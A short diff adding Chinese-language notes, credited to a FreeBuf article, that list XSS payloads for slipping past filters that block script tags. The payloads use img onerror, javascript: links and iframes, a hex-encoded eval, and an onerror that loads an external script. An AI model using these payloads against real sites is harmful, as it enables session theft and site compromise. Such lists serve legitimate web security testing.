@@ -36,4 +36,14 @@
 
 
 
+来自freebuf的Black-hole文章：
+
+  如果过滤或者禁止提交script时：
+
+    利用图片加载错误执行脚本：	<img src=1 onerror=alert('xss') />
+    利用跳转内容执行脚本：	<a href=javascrip:alert('xss')>s</a>
+    使用框架来执行脚本：	<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>
+    使用eval绕过：		<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")>
+    创建元素：			<img src=x onerror=appendChild(createElement('script')).src='js_url' />
+
 
